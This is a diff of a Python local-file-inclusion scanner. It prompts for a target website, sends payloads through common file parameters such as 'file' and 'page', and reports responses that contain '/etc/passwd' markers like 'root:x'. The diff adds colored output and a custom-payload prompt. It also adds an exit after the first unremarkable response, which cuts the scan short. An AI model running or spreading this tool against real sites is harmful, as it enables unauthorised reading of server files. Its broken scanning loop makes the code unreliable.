@@ -1,10 +1,9 @@
 import requests
 import time
+from colorama import init, Fore, Back, Style
+
 
 # Load payloads
-with open("payloads.txt", "r") as f:
-    payloads = [line.strip() for line in f if line.strip()]
-
 
 print(r'''
          
@@ -26,7 +25,15 @@ print(r'''
 ''')
 time.sleep(1)
 #input
-a = input("Enter Targeted Website (e.g., https://target.com/page.php): ").strip()
+a = input("Enter Targeted Website: ").strip()
+
+e = input("Do You Have Specific Payload? (No for Default): ")
+
+if e:
+    payloads = [e]
+else:
+    with open("payloads.txt", "r") as f:
+        payloads = [line.strip() for line in f if line.strip()]
 
 # Parameters
 param_names = ["filename", "viewpage", "page", "file", "viewfile"]
@@ -44,14 +51,19 @@ for payload in payloads:
 
             # detection logic
             if "root:x" in response.text:
-                print("[!!] Possible LFI here! Stopping.")
+                print(Fore.GREEN + "[!!] Possible LFI here! Stopping.")
                 exit(0)
             elif "admin" in response.text or "localhost" in response.text:
-                print("[!] Need attention")
+                print(Fore.YELLOW + "[!] Need attention")
+            elif "daemon:x" in response.text:
+                print(Fore.YELLOW + "[!] Need attention")
+            elif ":/bin/bash" in response.text:
+                print(Fore.YELLOW + "[!] Need Attention")
             else:
-                print('    Response length:', len(response.text))
+                print(Fore.BLUE + '    Response length:', len(response.text))
+                exit(0)
 
             print("-" * 60)
         except requests.RequestException as e:
-            print("[!!] Error while sending request:", str(e))
+            print(Fore.RED + "[!!] Error while sending request:", str(e))
 
